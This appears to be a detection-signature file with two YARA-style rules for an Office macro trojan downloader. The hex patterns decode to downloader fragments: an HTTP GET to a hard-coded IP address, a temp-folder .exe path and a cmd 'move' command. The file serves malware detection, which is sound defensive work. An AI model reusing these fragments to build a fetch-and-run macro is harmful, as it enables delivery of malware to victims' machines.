...
rule TrojanDownloader_O97M_EncDoc_ASS_MTB{
	...
	strings :
		$a_01_0 = {6f 62 6a 58 4d 4c 2e 4f 70 65 6e 20 22 47 45 54 22 2c 20 22 68 74 74 70 3a 2f 2f 32 30 2e 36 39 2e 39 37 2e 33 31 2f 6d 75 6d 22 2c 20 46 61 6c 73 65 } //01 00  objXML.Open "GET", "http://20.69.97.31/mum", False
		$a_03_1 = {3d 20 22 43 3a 5c 57 69 6e 64 6f 77 73 5c 54 65 6d 70 5c 90 02 2f 2e 65 78 65 22 90 00 } //01 00 
		$a_01_2 = {3d 20 22 20 2f 43 20 6d 6f 76 65 20 43 3a 5c 57 69 6e 64 6f 77 73 5c 54 65 6d 70 5c 6d 75 6d 22 20 26 20 22 20 22 20 26 20 } //01 00  = " /C move C:\Windows\Temp\mum" & " " & 
...
rule TrojanDownloader_O97M_EncDoc_ASS_MTB_2{
	...
	strings :
		...
		$a_01_1 = {20 3d 20 45 6e 76 69 72 6f 6e 28 22 54 45 4d 50 22 29 20 26 20 22 5c 22 20 26 20 } //01 00   = Environ("TEMP") & "\" & 
		...
		$a_01_5 = {73 65 74 4f 70 74 69 6f 6e 28 32 29 20 3d 20 31 33 30 35 36 } //00 00  setOption(2) = 13056
	condition:
		any of ($a_*)
